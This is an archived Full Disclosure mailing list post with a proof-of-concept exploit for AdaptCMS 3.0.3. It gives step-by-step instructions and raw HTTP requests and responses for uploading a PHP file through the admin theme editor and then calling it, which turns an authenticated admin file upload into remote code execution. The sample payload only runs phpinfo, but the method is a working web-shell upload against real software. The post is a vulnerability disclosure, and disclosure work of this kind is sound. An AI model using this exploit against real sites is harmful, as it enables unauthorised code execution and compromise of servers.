---
title: Authenticated File Upload to RCE - adaptcmsv3.0.3
url: https://seclists.org/fulldisclosure/2025/Jun/5
source: Full Disclosure
date: 2025-06-04
fetch_date: 2025-10-06T22:56:31.099715
---

# Authenticated File Upload to RCE - adaptcmsv3.0.3

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](4)
[By Date](date.html#5)
[![Next](/images/right-icon-16x16.png)](6)

[![Previous](/images/left-icon-16x16.png)](4)
[By Thread](index.html#5)
[![Next](/images/right-icon-16x16.png)](6)

![](/shared/images/nst-icons.svg#search)

# Authenticated File Upload to RCE - adaptcmsv3.0.3

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sun, 1 Jun 2025 16:05:53 +0100

---

```
# Exploit Title: Authenticated File Upload to RCE - adaptcmsv3.0.3
# Date: 06/2025
# Exploit Author: Andrey Stoykov
# Version: 3.0.3
# Tested on: Debian 12
# Blog: https://msecureltd.blogspot.com/

Authenticated File Upload to RCE #1:

Steps to Reproduce:

1. Login as admin user and visit "System" > "Appearance" > "Themes" >
"Default" > "Theme Files" and choose "Add New File"
2. Select "Add File"
3. In the "File Contents" add the following payload "<?php phpinfo(); ?>"
4. Choose "File Extension" to be "php" and set "Folder Location" to "Images"
5. Upon uploading the file it would be available under the "img" directory

// HTTP POST request

POST /adaptcms/admin/themes/asset_add/Default HTTP/1.1
Host: 192.168.58.131
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0)
Gecko/20100101 Firefox/140.0
[...]

[...]
------geckoformboundary648cea5cd97a776abc03a12296adaf90
Content-Disposition: form-data; name="data[Asset][filename]"; filename=""
Content-Type: application/octet-stream

------geckoformboundary648cea5cd97a776abc03a12296adaf90
Content-Disposition: form-data; name="data[Asset][content]"

<?php phpinfo(); ?>
------geckoformboundary648cea5cd97a776abc03a12296adaf90
Content-Disposition: form-data; name="data[Asset][file_extension]"

php
------geckoformboundary648cea5cd97a776abc03a12296adaf90
Content-Disposition: form-data; name="data[Asset][file_name]"

test
------geckoformboundary648cea5cd97a776abc03a12296adaf90
Content-Disposition: form-data; name="data[Asset][folder]"

img/
------geckoformboundary648cea5cd97a776abc03a12296adaf90
Content-Disposition: form-data; name="data[Asset][theme]"
[...]

// HTTP Response

HTTP/1.1 302 Found
Date: Fri, 30 May 2025 16:06:57 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: PHP/5.6.40
Location: http://192.168.58.131/adaptcms/admin/themes/edit/Default#assets
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

// HTTP Request triggering the webshell

GET /adaptcms/app/webroot/img/test.php HTTP/1.1
Host: 192.168.58.131
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0)
Gecko/20100101 Firefox/140.0
[...]

// HTTP Response triggering the webshell

HTTP/1.1 200 OK
Date: Fri, 30 May 2025 16:15:36 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: PHP/5.6.40
Keep-Alive: timeout=5, max=98
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 102019

[...]
<h1 class="p">PHP Version 5.6.40</h1>
</td></tr>
</table>
<table>
<tr><td class="e">System </td><td class="v">Linux debian 6.1.0-32-amd64 #1
SMP PREEMPT_DYNAMIC Debian 6.1.129-1 (2025-03-06) x86_64 </td></tr>
<tr>
[...]
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](4)
[By Date](date.html#5)
[![Next](/images/right-icon-16x16.png)](6)

[![Previous](/images/left-icon-16x16.png)](4)
[By Thread](index.html#5)
[![Next](/images/right-icon-16x16.png)](6)

### Current thread:

* **Authenticated File Upload to RCE - adaptcmsv3.0.3** *Andrey Stoykov (Jun 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")